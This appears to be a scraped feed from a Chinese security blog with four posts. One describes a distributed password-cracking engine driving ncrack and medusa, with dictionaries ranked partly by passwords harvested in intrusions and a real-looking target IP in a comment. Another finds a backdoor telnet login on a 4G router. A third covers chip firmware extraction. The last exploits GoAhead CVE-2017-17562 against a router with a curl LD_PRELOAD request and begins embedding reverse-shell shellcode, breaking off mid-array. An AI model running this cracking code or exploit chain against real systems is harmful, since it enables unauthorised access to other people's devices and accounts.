    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新的算法，本文以一个分布式扫描器的爆破模块为例，演示如何进行高效快速的分布式爆破。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/6172922.jpg" alt="617292"></p><h2 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h2><p>传统的密码穷举</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15156625175922.jpg" alt=""><br>效率非常低，而且还有可能触发报警  </p><h2 id="king-of-zombie"><a href="#king-of-zombie" class="headerlink" title="king of zombie"></a>king of zombie</h2><p>koz (king of zombie) 算法,即首先按照多种算法对用户名密码字典组合进行评分,然后用评分最高的组合去淘汰僵尸主机。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>上游push ncrack任务到队列</li><li>koz 节点开始瓜分队列任务,保存为任务列表 (根据cpu,网速来分配多少任务) 。</li><li>使用账号密码字典爆破来遍历任务列表,hit中 即从列表中淘汰(字典按评分优先级排序)。</li></ol><ul><li>说明</li></ul><ol><li><p>字典评分按照爆破成功记录次数和蜜罐记录次数来计算,master 端实时更新,koz node 每日定时更新。</p></li><li><p>淘汰机制具体为先去除一大部分普遍存在的弱口令,例如某一批次中,第一次使用 ubnt/ubnt 来爆破ssh服务,就能淘汰 15% 的任务,第二次使用 root/123456 能淘汰 3% 。</p></li></ol><h3 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h3><p>pw_koz_level </p><table><thead><tr><th>列</th><th>类型</th><th>注释</th></tr></thead><tbody><tr><td>id</td><td>int(11)</td><td>自动增量</td></tr><tr><td>username</td><td>varchar(255)</td><td>用户名</td></tr><tr><td>password</td><td>varchar(255)</td><td>密码</td></tr><tr><td>type</td><td>varchar(255)</td><td>类型</td></tr><tr><td>score</td><td>int(11)</td><td>评分</td></tr></tbody></table><h3 id="更新算法"><a href="#更新算法" class="headerlink" title="更新算法"></a>更新算法</h3><p>目前数据来源有四个<br>第一个  扫描器爆破成功记录  score 值为 10<br>第二个  蜜罐记录   score 值 为 1<br>第三个  渗透进去提取到的有效密码(例如windows 明文)  ,score 10<br>第四个  收集的各种工具扫描字典  score 值为 1</p><p>扫描的时候工具score 值来排序,命中一次之后+10 </p><p>例如如下字典列表</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15228255230476.jpg" alt=""></p><h4 id="master"><a href="#master" class="headerlink" title="master"></a>master</h4><p>推送任务之后使用无状态扫描工具扫描服务和指纹识别</p><h4 id="koz-node"><a href="#koz-node" class="headerlink" title="koz node"></a>koz node</h4><p>KozTask 类来保存本地任务队列,接收处的代码为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pop_member</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> self.len() &gt;  <span class="number">0</span>:</span><br><span class="line">        str_member=self.pop()</span><br><span class="line">        koz_member=ast.literal_eval(str_member)</span><br><span class="line">        self.list_member[str(koz_member[<span class="string">'name'</span>])].append(koz_member)</span><br><span class="line">    util.log(<span class="string">"pop koz_member  done count:%d"</span>  % (self.count()),<span class="number">2</span>,<span class="string">'koztask'</span>)</span><br></pre></td></tr></table></figure><p>本地队列处理完毕之后,开始foreach 循环用户名密码组合(根据score 大小优先级)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">koz_levels=get_koz_level()</span><br><span class="line"><span class="keyword">for</span> koz_level  <span class="keyword">in</span>  koz_levels :</span><br><span class="line">    koz_queue.queue.clear()</span><br><span class="line">    <span class="comment">#member=&#123;'name': 'ssh', 'task_id': 1124, 'url': '', 'host': '168.167.45.250', 'version': '', 'type': 'service', 'port': 22&#125;</span></span><br><span class="line">    <span class="comment">#ncrack.scan(member,koz_level)</span></span><br><span class="line">    <span class="comment">#break</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        <span class="keyword">for</span> member  <span class="keyword">in</span>   koz_task.list_member[koz_level[<span class="string">'type'</span>]] :</span><br><span class="line">            koz_queue.put(&#123;<span class="string">'member'</span>:member,<span class="string">'level'</span>:koz_level&#125;)</span><br><span class="line"></span><br><span class="line">        work_manager = WorkManager(koz_queue, config.koz_thread)  <span class="comment"># thread</span></span><br><span class="line">        work_manager.wait_allcomplete()</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        util.log(<span class="string">"error info:"</span>+str(e),<span class="number">3</span>,<span class="string">'koz_node'</span>)</span><br><span class="line">    util.log(<span class="string">'koz_member len:%d'</span> % (koz_task.count()),<span class="number">1</span>,<span class="string">'koz_node'</span>)</span><br></pre></td></tr></table></figure><p>当扫描出来结果时,直接把它从 koz_member 队列里面remove 掉,如此循环往复,直到跑完所有的密码。<br>remove </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>  <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> self.work_queue.empty() == <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        task = self.work_queue.get(block=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">if</span> ncrack.scan(task[<span class="string">'member'</span>],task[<span class="string">'level'</span>])  != <span class="keyword">False</span> :</span><br><span class="line">            koz_type=task[<span class="string">'member'</span>][<span class="string">'name'</span>]</span><br><span class="line">            koz_task.list_member[koz_type].remove(task[<span class="string">'member'</span>])</span><br></pre></td></tr></table></figure><h3 id="爆破算法"><a href="#爆破算法" class="headerlink" title="爆破算法"></a>爆破算法</h3><p>负责爆破的为ncrack 模块,调用的爆破工具有  medusa,ncrack。<br>部分实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(target,level)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> target[<span class="string">'name'</span>]  == <span class="string">'ms-wbt-server'</span>  <span class="keyword">or</span>  target[<span class="string">'name'</span>]  == <span class="string">'telnet'</span> :</span><br><span class="line">        str_command = <span class="string">"ncrack --user %s --pass %s  %s:%d "</span>  %  (level[<span class="string">'username'</span>],level[<span class="string">'password'</span>],target[<span class="string">'host'</span>],target[<span class="string">'port'</span>])</span><br><span class="line">        str_ret=str(sys_exec([<span class="string">'ncrack'</span>, <span class="string">'--user'</span>,level[<span class="string">'username'</span>], <span class="string">'--pass'</span>, level[<span class="string">'password'</span>], target[<span class="string">'host'</span>]+<span class="string">':'</span>+ str(target[<span class="string">'port'</span>])]))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        str_command = <span class="string">"medusa -u %s -p %s -h %s -n %d  -M %s"</span> % (level[<span class="string">'username'</span>], level[<span class="string">'password'</span>], target[<span class="string">'host'</span>], target[<span class="string">'port'</span>], target[<span class="string">'name'</span>])</span><br><span class="line">        str_ret=str(sys_exec([<span class="string">'medusa'</span>,<span class="string">'-u'</span>,level[<span class="string">'username'</span>],<span class="string">'-p'</span>,level[<span class="string">'password'</span>],<span class="string">'-h'</span>,target[<span class="string">'host'</span>],<span class="string">'-n'</span>,str(target[<span class="string">'port'</span>]),<span class="string">'-M'</span>,target[<span class="string">'name'</span>]]))</span><br><span class="line">    </span><br><span class="line">    util.log(str_command, <span class="number">2</span>, <span class="string">'ncrack'</span>)</span><br><span class="line">    <span class="comment">#need  change </span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ACCOUNT FOUND'</span> <span class="keyword">in</span> str_ret  <span class="keyword">or</span>  <span class="string">'credentials'</span>  <span class="keyword">in</span> str_ret:</span><br><span class="line">        str_data=<span class="string">'[%s] %s %s:%s'</span>   %  (target[<span class="string">'name'</span>],target[<span class="string">'host'</span>],level[<span class="string">'username'</span>],level[<span class="string">'password'</span>])</span><br><span class="line">        util.log(<span class="string">'ncrack taskid:%d target:%s service:%s succeed'</span> % (target[<span class="string">'task_id'</span>], target[<span class="string">'host'</span>], target[<span class="string">'name'</span>]), <span class="number">1</span>, <span class="string">'ncrack'</span>)</span><br><span class="line">        <span class="keyword">return</span> report(target,str_data)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>  :</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h3><p> 总览<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/14703046762519.png" alt=""></p><p>图文分析</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/14703047183607.jpg" alt=""></p><p>部分结果一览</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/147030475970560.jpg" alt="147030475970560"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新
      
    
    </summary>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="密码爆破" scheme="http://yaseng.org/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>某4G无线路由终端分析</title>
    <link href="http://yaseng.org/analysis-of-a-4G-wireless-router.html"/>
    <id>http://yaseng.org/analysis-of-a-4G-wireless-router.html</id>
    <published>2018-01-19T16:00:00.000Z</published>
    <updated>2018-06-29T10:23:45.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="设备介绍"><a href="#设备介绍" class="headerlink" title="设备介绍"></a>设备介绍</h2><p>随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，在通过wifi模块将蜂窝网络转为wifi信号共享给其他设备使用，其原理与手机共享热点类似，因其便携省电等功能，目前在市场上的反响颇高，X宝销量达数万件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171902.jpg" alt="1224171902"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171219164331.jpg" alt="QQ截图20171219164331"></p><h2 id="硬件分析"><a href="#硬件分析" class="headerlink" title="硬件分析"></a>硬件分析</h2><p>话不多说，进入正题，拆掉背面螺丝，取出电池，揭掉正面盖板，在正面PCB上是一块全彩TFT屏幕，显示效果一般，屏幕下方有多个印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903.jpg" alt="1224171903"></p><p>左侧有两个焊点，分别是RXD和TXD口，可以通过UART模式调试。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903a.jpg" alt="1224171903a"></p><p>下方左侧是8口的JTAG调试口，加一个公用GND口，JTAG调试下篇会重点介绍。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903b.jpg" alt="1224171903b"></p><p>正下方靠近USB充电口位置是电源电压测试口，主要用来测量额定输入输出的电源电压。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903c.jpg" alt="1224171903c"></p><p>拆掉PCB上的螺丝，翻转板子，背面包括SIM插槽、SD卡插槽以及核心处理芯片，出于保护和散热的目的，还加装了保护盖。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171904.jpg" alt="1224171904"></p><p>拆掉盖子，先看下主要芯片的型号和用途，这对进一步分析有很大帮助。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171905-bianhao.jpg" alt="1224171905-bianhao"></p><p>图上标注1的芯片通过查看印字分析,为芯天下出产的PN26Q01AWSIUG 型存储芯片，存储容量为1G。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191431.jpg" alt="20171218_191431"></p><p>标注2的芯片为中兴微电子生产的ZX297520型手机modem芯片，支持TD-LTE/FDD LTE /WCDMA/TD-SCDMA/EDGE全模制式。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191405.jpg" alt="20171218_191405"></p><p>标注3的芯片为Realtek生产的使用非常广泛的RTL8189ES无线wifi芯片，是一款高性能、低功耗、体积小SDIO接口无线模组。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191336.jpg" alt="20171218_191336"></p><p>标注4的芯片为中兴微电子生产的ZX23422电源管理芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191524.jpg" alt="20171218_191524"></p><p>标注5的芯片为锐迪科（RDA）生产的RPM6743射频前端芯片，是蜂窝网络和wifi信号广播收发的重要组成部分。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191505.jpg" alt="20171218_191505"></p><h2 id="串口调试"><a href="#串口调试" class="headerlink" title="串口调试"></a>串口调试</h2><p>在认识设备的基本构成之后，重新组装好，首先通过正面的UART调试串口来进行初步调试，采用夹具连接RXD、TXD两个调试点，在设备通电情况下，只需把转接板上的GND口与板子上的公用GND口相连即可。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image89.jpg" alt="image89"></p><p>因串口输出信息过多，影响观察输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image90.jpg" alt="image90"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image91.jpg" alt="image91"></p><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>查看当前进程，通过串口输出信息，发现该终端采用goahead作为web服务器，4719端口存在一个telnet服务。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/hgjghjtyut.jpg" alt="命令"></p><p>连接wifi进入web管理界面，查看设备ip。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136011800782.jpg" alt="15136011800782"></p><p>通过telnet连接设备，使用弱口令弱口令：admin、admin即可登录。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136011175389.jpg" alt="15136011175389"></p><p>该账号为后门账号。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136012728967.jpg" alt="15136012728967">查看开启的端口。</p><p>如果需要继续分析，可以通过tftp 传输文件至本地，例如/bin/goahead。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;设备介绍&quot;&gt;&lt;a href=&quot;#设备介绍&quot; class=&quot;headerlink&quot; title=&quot;设备介绍&quot;&gt;&lt;/a&gt;设备介绍&lt;/h2&gt;&lt;p&gt;随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>芯片安全系列-Let&#39;s cook!</title>
    <link href="http://yaseng.org/chip-security-let-us-cook.html"/>
    <id>http://yaseng.org/chip-security-let-us-cook.html</id>
    <published>2018-01-16T16:00:00.000Z</published>
    <updated>2018-06-29T10:27:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼于上层应用和驱动层面的安全，然而如果芯片存在本质的设计缺陷或安全漏洞，传统安全手段往往很难触及底层，前段时间英特尔芯片的“崩溃”（Meltdown）和“幽灵”（Spectre）漏洞，轰动整个世界，造成了巨额的损失，此次漏洞爆发就是因为芯片自身的设计缺陷所导致的，芯片级的安全研究是一项长期而艰难的工作，其是一门涉及多学科多门类的综合性研究，包括：微电子学、计算机科学、数学、物理学、化学、电磁学、光学等等。芯片分析方式主要包括非侵入式、半侵入式、侵入式、侧信道等。本文通过对某款蓝牙锁芯片的处理和固件提取，作为芯片分析的简单实例。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/dfghfghfhg.jpg" alt="dfghfghfhg"></p><h2 id="拆焊"><a href="#拆焊" class="headerlink" title="拆焊"></a>拆焊</h2><p>在PCB背面有一颗CC2541的蓝牙芯片，此款芯片采用QFN-40封装格式，没有暴露的可以直连外部引脚，厂商在量产时也把调试接口去掉了，为了获取芯片的固件内容，需要进行拆焊。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/fghgjty555.jpg" alt="fghgjty555"></p><p>拆焊所需工具包括：热风枪、焊枪、松香水、吸锡线、洗板水或无水酒精、无纺布、镊子等。热风枪温度调到360度，风速在5档左右，先在距离PCb上方3到5厘米处，给PCB预热几秒，然后缓缓下移到1厘米处，沿着芯片的四周匀速转动，枪口务必不要对准芯片的中心处，防止芯片过热，造成损毁，大概20秒左右即可融化芯片底部焊锡，另一只手用镊子夹住芯片，轻轻往上一提，芯片即可从PCB取下。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134552.jpg" alt="20180116_134552"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134549.jpg" alt="20180116_134549"></p><h2 id="清洁"><a href="#清洁" class="headerlink" title="清洁"></a>清洁</h2><p>取下芯片之后，芯片的底部会粘有很多未去除的焊锡和脏物，需要进一步清洁处理，首先滴上松香水，用焊枪使焊锡融化。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134618.jpg" alt="20180116_134618"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134719.jpg" alt="20180116_134719"></p><p>然后用吸锡线配合焊枪把多余的焊锡和脏物吸掉，反复几次。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134735.jpg" alt="20180116_134735"></p><p>处理完毕之后，用洗板水和无纺布擦洗芯片，彻底去除脏物残留，引脚应保持光亮，以防接触不良和短路。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134815.jpg" alt="20180116_134815"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134845.jpg" alt="20180116_134845"></p><p>焊锡、松香水和洗板水气味比较刺鼻，高温易伤手，工作环境需要注意通风，有条件可以配置防护服。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28.jpg" alt="breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28"></p><h2 id="芯片读取"><a href="#芯片读取" class="headerlink" title="芯片读取"></a>芯片读取</h2><p>CC2541芯片是TI出品的一款蓝牙芯片，TI有专门的工具和软件来读取，包括：CCDebugger调试器和SmartRF Flash Programmer软件，因芯片已经拆下，可以通过转接板或烧录座连接芯片，引出相应的接口，然后连接CCDebugger进行固件的读取。</p><p>把处理好的芯片放入烧录座，需要正确放置芯片，可以通过芯片正面的小圆点确定方向。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134912.jpg" alt="20180116_134912"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135324.jpg" alt="20180116_135324"></p><p>确认无误之后，压紧烧录座盖，连上CCDebugger。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135403.jpg" alt="20180116_135403"></p><p>打开SmartRF Flash Programmer，选择Read flash into hex-file选项，在Flash image选项可以选择保存的路径和文件名，然后点Perform actions，即可开始读取。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135409.jpg" alt="QQ截图20180116135409"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135434.jpg" alt="QQ截图20180116135434"></p><p>读取的文件格式为HEX，然后根据对应的CPU指令编写进行反汇编。   </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/78B82770-AB46-4404-B195-2B28835DF2AC.jpg" alt="QQ截图20180116135452"></p><p>部分芯片另需进行开片和晶体电路修改等等深度处理，本文是伏宸实验室关于芯片安全的一篇先导性文章，后续将会有一系列关于芯片安全的文章，敬请期待。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h2 id=&quot;前言-1&quot;&gt;&lt;a href=&quot;#前言-1&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p
      
    
    </summary>
    
      <category term="芯片安全" scheme="http://yaseng.org/categories/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="芯片安全" scheme="http://yaseng.org/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战</title>
    <link href="http://yaseng.org/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html"/>
    <id>http://yaseng.org/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html</id>
    <published>2017-12-25T16:00:00.000Z</published>
    <updated>2018-06-29T10:28:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要分析了该漏洞详情，并在某款路由器上成功复现，反弹shell。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>   这个漏洞出现在goahead/src/cgi.c:cgihandler函数中，它使用http请求参数中的键值对来初始化新进程的envp参数，在此处只对“REMOTE_HOST”和“HTTP_AUTHORIZATION”参数进行了判断，其他参数全部默认信任。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816099569.jpg" alt=""></p><p>随后，该函数又将子进程标准输入输出指定到了一个临时文件，而这个临时文件是由post请求的数据部分初始化的，最后launchCgi函数使用从http请求中得到的参数和标准输入输出创建了cgi脚本进程。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816744632.jpg" alt=""></p><p>查看goahead的elf header可以得到其interp段依赖链接器“/lib64/ld-linux-x86-64.so.2”，动态链接器是在链接过程中最先运行的代码，它用来加载目标程序的共享库和符号表。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137935699186.jpg" alt=""></p><p>在链接器链接过程中会根据环境变量的值进行不同的操作，其中LD_PRELOAD变量可以指定一个共享库列表，链接器会优先加载此列表中共享库。<br>如果我们在http请求中指定LD_PRELOAD环境变量，此变量将被当作启动cgi脚本的参数传递给链接器，从而可以在cgi脚本启动之前执行任意.so文件，由于post请求中的数据被保存到/tmp文件夹中的一个临时文件中，而launchCgi函数又将cgi脚本的标准输入输出指定到了该临时文件，因此我们可以远程向目标写入一个.so文件，并将LD_PRELOAD指定为“/proc/self/fd/0”来间接引用post请求数据创建的临时文件，从而在目标系统上执行任意代码。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="调试设备"><a href="#调试设备" class="headerlink" title="调试设备"></a>调试设备</h3><p>为了验证该漏洞的真实危害性，找了B-LINK的一款路由器来做测试，首先通过路由器上的UART串口，进入路由器的调试窗口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/IMG_2461.jpg" alt="IMG_2461"></p><p>查看web server 是否 goahead 并且有cgi程序。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/debug.jpg" alt="debug"></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>有四个cgi文件，找到一个能使用的upload_settings.cgi(需要登陆）</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137864957443.jpg" alt=""></p><p>此路由器的系统为 mipsel，原作者没有给出mips小端格式的测试so，使用mipsel交叉编译Buildroot编译一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pentest@ubuntu:~/buildroot$ cat   mipsel-hw.c</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">static void before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    write(1, &quot;Hello: World!\n&quot;, 14);</span><br><span class="line">&#125;</span><br><span class="line">pentest@ubuntu:~/buildroot$ ./mipsel-linux-gcc -shared -fPIC  mipsel-hw.c -o mipsel-hw.so</span><br><span class="line">pentest@ubuntu:~/buildroot$ file mipsel-hw.so</span><br><span class="line">mipsel-hw.so: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, not stripped</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST   -b  &quot;user=admin;platform=0&quot;  --data-binary @payloads/mipsel-hw.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0 -i</span><br></pre></td></tr></table></figure><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137866081821.jpg" alt=""></p><p>回显成功，说明漏洞存在。</p><h3 id="生成-payload"><a href="#生成-payload" class="headerlink" title="生成 payload"></a>生成 payload</h3><p>使用routesplite 生成一个mipsel 下的reverse_tcp shellcode 。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137880896364.jpg" alt=""></p><p>写入动态链接库中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char sc[] = &#123;</span><br><span class="line">    &quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04&quot;</span><br><span class="line">    &quot;\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20&quot;</span><br><span class="line">    &quot;\x80\x01\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27&quot;</span><br><span class="line">    